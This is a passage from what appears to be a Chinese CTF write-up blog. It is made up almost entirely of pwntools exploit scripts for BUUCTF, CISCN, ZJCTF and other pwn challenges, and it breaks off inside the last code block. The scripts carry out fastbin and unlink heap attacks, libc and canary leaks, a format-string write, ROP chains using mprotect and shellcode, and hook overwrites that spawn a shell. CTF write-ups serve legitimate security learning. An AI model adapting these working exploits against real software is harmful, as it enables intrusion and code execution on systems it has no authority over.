sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;3&quot;)</span><br><span class="line">	sh.sendlineafter(&quot;?&quot;,str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;)</span><br><span class="line">	sh.sendlineafter(&quot;?&quot;,str(idx))</span><br><span class="line">def inputName(content):</span><br><span class="line">	sh.sendafter(&quot;what is your name?&quot;,content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_nw_4&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;x64_libc.so.6&quot;)</span><br><span class="line">	inputName(p64(0x61) * (0x100 &#x2F; 8))</span><br><span class="line">	add(0x68,&#39;\x11&#39; * 0x68)</span><br><span class="line">	add(0x68,&#39;\x12&#39; * 0x68)</span><br><span class="line">	payload &#x3D; &#39;\x13&#39; * 0x50 + p64(0) + p64(0x71)</span><br><span class="line">	add(0x68,payload)	</span><br><span class="line">	add(0x88,&#39;\x14&#39; * 0x88)</span><br><span class="line">	add(0x38,&#39;\x15&#39; * 0x38)</span><br><span class="line">	add(0x38,&#39;\x15&#39; * 0x38)</span><br><span class="line">	add(0x58,&#39;%17$paaaa%54$p&#39;)</span><br><span class="line">	free(3)</span><br><span class="line">	show(3)</span><br><span class="line">	main_arena &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;)) - 88</span><br><span class="line">	libc &#x3D; main_arena - 0x10 - lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">	system &#x3D; libc +lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc +lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	__free_hook &#x3D; libc +lib.symbols[&#39;__free_hook&#39;]</span><br><span class="line">	__malloc_hook &#x3D; libc +lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">	stdout &#x3D; libc + lib.symbols[&#39;_IO_2_1_stdout_&#39;]</span><br><span class="line">	printf &#x3D; libc + lib.symbols[&#39;printf&#39;]</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(0)</span><br><span class="line">	show(0)</span><br><span class="line">	heap_base &#x3D; (u64(sh.recvuntil(&#39;\n--------------------&#39;,True)[-3:].ljust(8,&#39;\x00&#39;)) &gt;&gt; 8) &lt;&lt; 8</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	payload &#x3D; &#39;\x00&#39; * 3</span><br><span class="line">	payload +&#x3D; p64(0) * 6</span><br><span class="line">	payload +&#x3D; p64(0xfbad1800) + p64(0) * 3 + p64(libc + lib.symbols[&#39;environ&#39;]) + p64(libc + lib.symbols[&#39;environ&#39;] + 0x8)</span><br><span class="line">	add(0x68,payload)</span><br><span class="line">	stack_end &#x3D; u64(sh.recvuntil(&quot;--------------------&quot;,True)[-8:])</span><br><span class="line">	canary_pos &#x3D; stack_end - (0xe548 - 0xe448)</span><br><span class="line">	fastbin_attack &#x3D; stack_end - 0x7fffffffe548 + 0x7fffffffe2c5 + 8</span><br><span class="line">	ret_addr &#x3D; stack_end - 0x7fffe75e88f8 + 0x7fffe75e86b8</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(0)</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	add(0x68,p64(stdout - 0x43))</span><br><span class="line">	payload &#x3D; &#39;\x00&#39; * 3</span><br><span class="line">	payload +&#x3D; p64(0) * 6</span><br><span class="line">	payload +&#x3D; p64(0xfbad1800) + p64(0) * 3 + p64(canary_pos) + p64(canary_pos + 0x8)</span><br><span class="line">	add(0x68,payload)</span><br><span class="line">	canary &#x3D; u64(sh.recvuntil(&quot;--------------------&quot;,True)[-8:])</span><br><span class="line">	pop_rdi_ret &#x3D; 0x400d43</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(0)</span><br><span class="line">	add(0x68,p64(fastbin_attack))</span><br><span class="line">	add(0x68,p64(fastbin_attack))</span><br><span class="line">	add(0x68,p64(fastbin_attack))</span><br><span class="line">	offset &#x3D; 40</span><br><span class="line">	payload &#x3D; &#39;\x00&#39; * 3</span><br><span class="line">	payload +&#x3D; &#39;\x00&#39; * offset</span><br><span class="line">	payload +&#x3D; p64(pop_rdi_ret)</span><br><span class="line">	payload +&#x3D; p64(0)</span><br><span class="line">	payload +&#x3D; p64(libc + lib.search(asm(&quot;pop rsi\nret&quot;)).next())</span><br><span class="line">	payload +&#x3D; p64(ret_addr)</span><br><span class="line">	payload +&#x3D; p64(libc + lib.search(asm(&quot;pop rdx\nret&quot;)).next())</span><br><span class="line">	payload +&#x3D; p64(0x100)</span><br><span class="line">	payload +&#x3D; p64(libc + lib.symbols[&#39;read&#39;])</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	add(0x68,payload)</span><br><span class="line">	offset &#x3D; 56</span><br><span class="line">	payload &#x3D; &#39;\x00&#39; * offset</span><br><span class="line">	payload +&#x3D; p64(pop_rdi_ret)</span><br><span class="line">	payload +&#x3D; p64((elf.bss() &gt;&gt; 12) &lt;&lt; 12)</span><br><span class="line">	payload +&#x3D; p64(libc + lib.search(asm(&quot;pop rsi\nret&quot;)).next())</span><br><span class="line">	payload +&#x3D; p64(0x2000)</span><br><span class="line">	payload +&#x3D; p64(libc + lib.search(asm(&quot;pop rdx\nret&quot;)).next())</span><br><span class="line">	payload +&#x3D; p64(7)</span><br><span class="line">	payload +&#x3D; p64(libc + lib.symbols[&#39;mprotect&#39;])</span><br><span class="line">	payload +&#x3D; p64(pop_rdi_ret)</span><br><span class="line">	payload +&#x3D; p64(0)</span><br><span class="line">	payload +&#x3D; p64(libc + lib.search(asm(&quot;pop rsi\nret&quot;)).next())</span><br><span class="line">	payload +&#x3D; p64(((elf.bss() &gt;&gt; 12) &lt;&lt; 12) + 0x800)</span><br><span class="line">	payload +&#x3D; p64(libc + lib.search(asm(&quot;pop rdx\nret&quot;)).next())</span><br><span class="line">	payload +&#x3D; p64(0x100)</span><br><span class="line">	payload +&#x3D; p64(libc + lib.symbols[&#39;read&#39;])</span><br><span class="line">	payload +&#x3D; p64(((elf.bss() &gt;&gt; 12) &lt;&lt; 12) + 0x800)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	shellcode  &#x3D; shellcraft.amd64.open(&quot;.&#x2F;flag.txt&quot;)</span><br><span class="line">	shellcode +&#x3D; shellcraft.amd64.read(3,elf.bss(),0x30)</span><br><span class="line">	shellcode +&#x3D; shellcraft.amd64.write(1,elf.bss(),0x30)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.send(asm(shellcode))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;pwn.buuoj.cn&quot;,20149,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x52-第五空间2019-决赛-PWN5">0x52 [第五空间2019 决赛]PWN5</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;pwn&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	sh.sendlineafter(&quot;:&quot;,p32(0x0804C044) + &quot;%10$n&quot;)</span><br><span class="line">	sh.sendlineafter(&quot;passwd&quot;,&quot;4&quot;)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;node2.buuoj.cn.wetolink.com&quot;,28856,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x53-ZJCTF-2019-EasyHeap">0x53 [ZJCTF 2019]EasyHeap</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;easyheap&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">	sh.sendlineafter(&quot;Your choice :&quot;,&quot;2&quot;)</span><br><span class="line">	sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">	sh.sendlineafter(&quot;:&quot;,str(size))</span><br><span class="line">	sh.sendafter(&quot;:&quot;,content)</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.sendlineafter(&quot;Your choice :&quot;,&quot;1&quot;)</span><br><span class="line">	sh.sendlineafter(&quot;:&quot;,str(size))</span><br><span class="line">	sh.sendlineafter(&quot;:&quot;,content)</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.sendlineafter(&quot;Your choice :&quot;,&quot;3&quot;)</span><br><span class="line">	sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;easyheap&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	add(0x68,&#39;&#39;)</span><br><span class="line">	add(0x68,&#39;&#39;)</span><br><span class="line">	add(0x68,&#39;&#39;)</span><br><span class="line">	free(2)</span><br><span class="line">	payload &#x3D; &#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">	payload &#x3D; payload.ljust(0x68,&#39;a&#39;)</span><br><span class="line">	payload +&#x3D; p64(0x71) + p64(0x6020ad)</span><br><span class="line">	edit(1,0x200,payload)</span><br><span class="line">	add(0x68,&#39;&#39;)</span><br><span class="line">	add(0x68,&#39;&#39;)</span><br><span class="line">	payload &#x3D; &#39;\xaa&#39; * 3 + p64(0) * 4 + p64(elf.got[&#39;free&#39;])</span><br><span class="line">	edit(3,len(payload) + 0x100,payload)</span><br><span class="line">	edit(0,9,p64(elf.plt[&#39;system&#39;]))</span><br><span class="line">	free(1)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;127.0.0.1&quot;,9999,1)</span><br></pre></td></tr></table></figure>
<h2 id="0x54-ZJCTF-2019-login">0x54 [ZJCTF 2019]login</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;login&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;login&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	payload &#x3D; &quot;admin\x00&quot;</span><br><span class="line">	sh.sendlineafter(&quot;:&quot;,payload)</span><br><span class="line">	sh.recvuntil(&quot;:&quot;)</span><br><span class="line">	payload &#x3D; &quot;2jctf_pa5sw0rd\x00&quot;</span><br><span class="line">	payload +&#x3D; &quot;aaaabaaac\x00aadaaaeaaafaaagaaahayyyyyyyyyyyyyyyyyyyyyyyyyyy&quot; + p64(0x400E9E)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;127.0.0.1&quot;,9999,1)</span><br></pre></td></tr></table></figure>
<h2 id="0x55-ciscn-2019-n-5">0x55 ciscn_2019_n_5</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_n_5&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_2019_n_5&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;x64_libc.so.6&quot;)</span><br><span class="line">	pop_rdi_ret &#x3D; elf.search(asm(&quot;pop rdi\nret&quot;)).next()</span><br><span class="line">	pop_rsi_r15_ret &#x3D; elf.search(asm(&quot;pop rsi\npop r15\nret&quot;)).next()</span><br><span class="line">	sh.sendlineafter(&quot;name&quot;,&#39;111&#39;)</span><br><span class="line">	offset &#x3D; 40</span><br><span class="line">	payload  &#x3D; offset * &quot;a&quot;</span><br><span class="line">	payload +&#x3D; p64(pop_rdi_ret) + p64(elf.got[&#39;__libc_start_main&#39;]) + p64(elf.plt[&#39;puts&#39;]) + p64(elf.symbols[&#39;main&#39;])</span><br><span class="line">	sh.sendlineafter(&quot;?&quot;,payload)</span><br><span class="line">	__libc_start_main &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">	libc &#x3D; __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">	system &#x3D; libc +lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc +lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	sh.sendlineafter(&quot;name&quot;,&#39;111&#39;)</span><br><span class="line">	offset &#x3D; 40</span><br><span class="line">	payload  &#x3D; offset * &quot;a&quot;</span><br><span class="line">	payload +&#x3D; p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">	sh.sendlineafter(&quot;?&quot;,payload)</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">	log.success(&quot;binsh: &quot; + hex(binsh))</span><br><span class="line">	log.success(&quot;__free_hook: &quot; + hex(__free_hook))</span><br><span class="line">	log.success(&quot;__malloc_hook: &quot; + hex(__malloc_hook))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;pwn.buuoj.cn&quot;,20141,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x56-ciscn-2019-s-1">0x56 ciscn_2019_s_1</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_s_1&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def add(idx,size,content):</span><br><span class="line">	sh.sendlineafter(&quot;4.show\n&quot;,&#39;1&#39;)</span><br><span class="line">	sh.sendlineafter(&quot;index:&quot;,str(idx))</span><br><span class="line">	sh.sendlineafter(&quot;size:&quot;,str(size))</span><br><span class="line">	sh.recvuntil(&quot;gift: &quot;)</span><br><span class="line">	data &#x3D; int(sh.recvuntil(&quot;\n&quot;,True),16)</span><br><span class="line">	sh.sendafter(&quot;content:&quot;,content)</span><br><span class="line">	log.success(&quot;idx&#x3D;&quot; + str(idx) + &quot; | address&#x3D;&quot; + hex(data))</span><br><span class="line">	return data</span><br><span class="line">def edit(idx,content):</span><br><span class="line">	sh.sendlineafter(&quot;4.show\n&quot;,&#39;3&#39;)</span><br><span class="line">	sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">	sh.sendafter(&quot;:&quot;,content)</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">	sh.sendlineafter(&quot;4.show\n&quot;,&#39;2&#39;)</span><br><span class="line">	sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">	sh.sendlineafter(&quot;4.show\n&quot;,&#39;4&#39;)</span><br><span class="line">	sh.sendlineafter(&quot;index:&quot;,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_s_1&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;x64_libc.so.6&quot;)</span><br><span class="line">	chunk_list &#x3D; 0x6020E0</span><br><span class="line">	chunk_size &#x3D; 0x602060</span><br><span class="line">	key2 &#x3D; 0x6022B8</span><br><span class="line">	key1 &#x3D; 0x6022BC</span><br><span class="line">	payload  &#x3D; p64(0) + p64(0xF1)</span><br><span class="line">	payload +&#x3D; p64(chunk_list - 0x18) + p64(chunk_list - 0x10)</span><br><span class="line">	payload  &#x3D; payload.ljust(0xF0,&#39;a&#39;)</span><br><span class="line">	payload +&#x3D; p64(0xF0)	</span><br><span class="line">	add(0,0xF8,payload)</span><br><span class="line">	add(1,0xF8,&#39;\n&#39;)</span><br><span class="line">	add(2,0xF8,&#39;\n&#39;)</span><br><span class="line">	add(3,0xF8,&#39;\n&#39;)</span><br><span class="line">	add(4,0xF8,&#39;\n&#39;)</span><br><span class="line">	add(5,0xF8,&#39;\n&#39;)</span><br><span class="line">	add(6,0xF8,&#39;\n&#39;)</span><br><span class="line">	payload  &#x3D; &#39;&#39;</span><br><span class="line">	payload  &#x3D; payload.ljust(0xF0,&#39;a&#39;)</span><br><span class="line">	payload +&#x3D; p64(0x100 * 5 - 0x10)</span><br><span class="line">	edit(4,payload)</span><br><span class="line">	free(5)</span><br><span class="line">	add(7,0xE8,&#39;\n&#39;)</span><br><span class="line">	add(8,0xF8,&#39;\n&#39;)</span><br><span class="line">	add(9,0xF8,&#39;\n&#39;)</span><br><span class="line">	add(10,0xF8,&#39;\n&#39;)</span><br><span class="line">	add(11,0xF8,&#39;\n&#39;)</span><br><span class="line">	add(12,0xF8,&#39;\n&#39;)</span><br><span class="line">	free(8)</span><br><span class="line">	edit(1,p64(0) + p64(key2 - 0x10))</span><br><span class="line">	add(13,0xF8,&#39;\n&#39;)</span><br><span class="line">	edit(0,p64(0) * 3 + p64(chunk_list) + p64(elf.got[&#39;__libc_start_main&#39;]))</span><br><span class="line">	show(1)</span><br><span class="line">	__libc_start_main &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))	</span><br><span class="line">	libc &#x3D; __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">	system &#x3D; libc +lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc +lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	__free_hook &#x3D; libc +lib.symbols[&#39;__free_hook&#39;]</span><br><span class="line">	edit(0,p64(chunk_list) + p64(__free_hook) + p64(binsh))</span><br><span class="line">	edit(1,p64(system))</span><br><span class="line">	free(2)</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">	log.success(&quot;binsh: &quot; + hex(binsh))</span><br><span class="line">	log.success(&quot;__free_hook: &quot; + hex(__free_hook))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;pwn.buuoj.cn&quot;,20152,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x57-fl0ppy-codegate-2016">0x57 fl0ppy_codegate_2016</h2>
<h3 id="经过黑盒测试，发现strcpy的漏洞，然后多次黑盒测试发现leak了libc和stack-addr，然后通过strcpy实现栈溢出，然后在main函数执行完毕时，进行栈迁移，迁移到rop处，从而执行system-bin-sh-x00">经过黑盒测试，发现strcpy的漏洞，然后多次黑盒测试发现leak了libc和stack_addr，然后通过strcpy实现栈溢出，然后在main函数执行完毕时，进行栈迁移，迁移到rop处，从而执行system(&quot;/bin/sh\x00&quot;)</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 